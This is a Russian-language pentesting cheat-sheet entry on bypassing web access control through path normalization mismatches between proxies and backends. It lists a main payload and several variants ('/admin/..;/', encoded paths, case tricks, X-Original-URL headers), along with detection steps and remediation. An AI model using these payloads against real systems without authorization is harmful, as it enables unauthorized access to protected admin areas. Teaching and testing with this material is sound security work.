---
id: auth-bypass-path-traversal-normalization
title: "Обход контроля доступа нормализацией пути"
type: auth-bypass
target: http
category: web
difficulty: intermediate
bypass: auth
tags: [auth-bypass, path, nginx, middleware]
tested_on: ["nginx + backend", "Spring Security", "Express"]
success_rate: 0.4
risk: high
cwe: "CWE-863"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-project-web-security-testing-guide/"
graph:
  - target: "auth-bypass"
    type: instance_of
  - target: "admin-panel"
    type: leads_to
  - target: "http-request-smuggling"
    type: related_to
---

# Обход контроля доступа нормализацией пути

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
/admin/..;/dashboard
```

## Explanation

Контроль доступа часто реализован сопоставлением префикса пути: middleware/gateway
видит `/admin` и требует роль, а backend после своей нормализации получает `/dashboard`.
Рассинхрон нормализации между прокси и приложением — массовый класс обходов:

- `/admin/..;/` (Tomcat трактует `;` как параметр пути)
- `/%2e/admin`, `/admin%20`, `/admin%09`, `/admin/.`
- `/ADMIN` (регистрозависимые правила против регистронезависимой ФС)
- `//admin`, `/./admin`, `/?/admin`, `/admin#`
- смена метода: `GET /admin` -> 403, `POST /admin/` или `X-Original-URL: /admin` -> 200
- заголовки переопределения пути в nginx+PHP: `X-Original-URL`, `X-Rewrite-URL`

## Detection

1. Возьмите защищённый URL и переберите варианты нормализации, сравнивая коды ответа.
2. Проверьте другие HTTP-методы и заголовки `X-Original-URL`/`X-Rewrite-URL`.
3. Инструменты: `donkey`, `smuggler`, Burp-расширение `Auth Matrix`, `403bypasser`.

## Remediation

- Единственная нормализация пути в одном месте (gateway), backend получает уже канонический путь.
- Авторизация по ресурсу/действию, а не по префиксу URL (ABAC/RBAC в слое сервиса).
- Отключить поддержку `;`-параметров пути, если не используются.
- Тесты на матрицу «метод x путь x роль» в CI.

## Variants

```
/admin..;/
```

```
/%2e/admin
```

```
//admin
```

```
/ADMIN
```

```
/admin%20
```

```
X-Original-URL: /admin
```
